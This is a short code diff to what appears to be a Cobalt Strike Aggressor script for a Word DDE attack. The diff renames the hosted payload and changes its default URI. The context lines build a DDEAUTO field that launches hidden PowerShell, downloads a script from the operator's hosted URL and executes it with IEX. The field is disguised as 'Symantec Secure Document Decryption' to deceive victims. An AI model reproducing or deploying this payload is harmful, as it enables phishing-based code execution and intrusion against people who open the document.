@@ -17,7 +17,7 @@ sub setup_attack {
 	$script = powershell(%options["listener"], , $arch);
 	
 	# host the script!
-	$url = site_host(%options["host"], %options["port"], %options["uri"], $script, "text/plain", "Scripted Web Delivery (powershell)"); 
+	$url = site_host(%options["host"], %options["port"], %options["uri"], $script, "text/plain", "DDEAuto (Staged)"); 
 
 	# tell the user what text to insert into word
 	prompt_text("Open Word, press CTRL-F9 and then paste the text below between the brackets into a Word Document: ", "DDEAUTO \"C:\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -NoP -sta -NonI -W Hidden IEX (New-Object System.Net.WebClient).DownloadString('" . $url . "'); # \" \"Symantec Secure Document Decryption\"", {});
@@ -29,7 +29,7 @@ popup attacks {
 		local('$dialog %defaults');
 
 		# setup our defaults
-		%defaults["uri"]  = "/a";
+		%defaults["uri"]  = "/dde";
 		%defaults["host"] = localip();
 		%defaults["port"] = 80;
 
